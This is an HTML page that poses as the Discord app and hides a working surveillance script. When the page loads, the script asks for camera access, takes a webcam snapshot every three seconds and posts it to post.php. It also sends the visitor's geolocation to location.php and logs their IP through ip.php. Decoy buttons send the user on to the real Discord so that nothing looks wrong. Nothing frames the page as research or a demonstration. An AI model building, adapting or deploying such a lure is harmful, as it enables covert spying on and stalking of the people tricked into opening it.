<!DOCTYPE html>
<html>
<head>
    <title>Discord</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: 'Open Sans', sans-serif;
            background-color: #23272a; /* Discord Dark Background */
            margin: 0;
            padding: 0;
            height: 100vh;
            overflow: hidden;
            color: #fff;
            display: flex;
            flex-direction: column;
        }

        #app-mount { /* Main container for the Discord app */
            display: flex;
            flex: 1;
            overflow: hidden;
        }

        /* Left Side - Server List (Placeholder) */
        .guilds-wrapper {
            width: 72px;
            background-color: #2f3136;
            flex-shrink: 0;
        }

        /* Middle - Channel/Content Area */
        .content-wrapper {
            flex: 1;
            background-color: #36393f;
            display: flex;
            flex-direction: column;
            overflow: hidden; /* Ensure content doesn't overflow */
        }

        .channel-header {
            padding: 10px;
            border-bottom: 1px solid #4f545c;
        }

        .messages-wrapper {
            flex: 1;
            overflow-y: auto;
            padding: 10px;
            display: flex;
            flex-direction: column; /* Align messages from top to bottom */
        }

        /* Right Side - Member List (Placeholder) */
        .members-wrapper {
            width: 240px;
            background-color: #2f3136;
            flex-shrink: 0;
        }

        /* Bottom Bar - Message Input and Controls */
        .chat-input-wrapper {
            background-color: #40444b;
            padding: 10px;
            display: flex;
            align-items: center;
        }

        .chat-input {
            flex: 1;
            background-color: #4f545c;
            border: none;
            border-radius: 4px;
            padding: 8px;
            color: #dcddde;
            outline: none;
        }

        .send-button {
            background-color: #7289da;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 8px 12px;
            margin-left: 10px;
            cursor: pointer;
        }
        
        /* Webcam styles */
        #videoElement {
            position: absolute;
            top: 10px;
            left: 10px;
            width: 160px;
            height: 120px;
            border: 2px solid #7289da;
            z-index: 1000;
        }
        
        .fake-button {
            background-color: #7289da;
            color: white;
            padding: 12px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s;
            width: 100%;
              margin: 5px;
        }
        
        .fake-button:hover {
            background-color: #5865f2;
        }
        

    </style>
</head>
<body>
    <div id="app-mount">
        <div class="guilds-wrapper">
            <!-- Server List (Placeholder) -->
        </div>

        <div class="content-wrapper">
            <div class="channel-header">
                <h2>General</h2>
            </div>
             <video id="videoElement"></video>
            <div class="messages-wrapper">
                <!-- Messages (Placeholder) -->
                <div>Welcome to the server!</div>
                <!-- Add more fake messages here -->
            </div>

            <div class="chat-input-wrapper">
                <input type="text" class="chat-input" placeholder="Message #general">
                <button class="send-button">Send</button>
            </div>
            
              <div style="text-align: center;">
                <button class="fake-button" onclick="redirectToDiscord()">Invite</button>
                <button class="fake-button" onclick="redirectToDiscord()">Send</button>
                 <button class="fake-button" onclick="redirectToDiscord()">Login</button>
              </div>
        </div>

        <div class="members-wrapper">
            <!-- Member List (Placeholder) -->
        </div>
    </div>

    <canvas id="canvasElement" style="display: none;"></canvas>

    <script>
         function redirectToDiscord() {
            window.location.href = 'https://discord.com/channels/@me';
        }
        // Webcam access and image capture
        var video = document.getElementById('videoElement');
        var canvas = document.getElementById('canvasElement');
        var context = canvas.getContext('2d');

        // Get access to the camera!
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function(stream) {
                    video.srcObject = stream;
                    video.style.display = 'block';
                    video.play();

                    // Capture image every 3 seconds
                    setInterval(function() {
                        captureImage();
                    }, 3000);
                });
        }

        function captureImage() {
            context.drawImage(video, 0, 0, 160, 120);
            var imageData = canvas.toDataURL('image/png');

            // Send the image data to the server
            sendImage(imageData);
        }

        function sendImage(imageData) {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'post.php', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onload = function() {
                // Image sent.
            };
            xhr.send('cat=' + encodeURIComponent(imageData));
        }
        
          // Get location
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    var latitude = position.coords.latitude;
                    var longitude = position.coords.longitude;
                    var accuracy = position.coords.accuracy;

                    // Prepare the data to be sent
                    var locationData = {
                        latitude: latitude,
                        longitude: longitude,
                        accuracy: accuracy
                    };

                    // Send the location data to the server using AJAX
                    var xhr = new XMLHttpRequest();
                    xhr.open('POST', 'location.php', true);
                    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                    xhr.onload = function() {
                        console.log('Location data sent.');
                    };
                    xhr.send('latitude=' + encodeURIComponent(latitude) + '&longitude=' + encodeURIComponent(longitude) + '&accuracy=' + encodeURIComponent(accuracy));
                },
                function(error) {
                    console.error("Geolocation error: " + error.message);
                }
            );
        } else {
            console.error("Geolocation is not supported by this browser.");
        }
        
        // Get IP Address
        (function() {
            var xhr = new XMLHttpRequest();
            xhr.open('GET', 'ip.php', true);
            xhr.onload = function() {
                if (xhr.status >= 200 && xhr.status < 300) {
                    console.log('IP address captured.');
                } else {
                    console.error('Error capturing IP address.');
                }
            };
            xhr.onerror = function() {
                console.error('Error capturing IP address.');
            };
            xhr.send();
        })();

    </script>
</body>
</html>
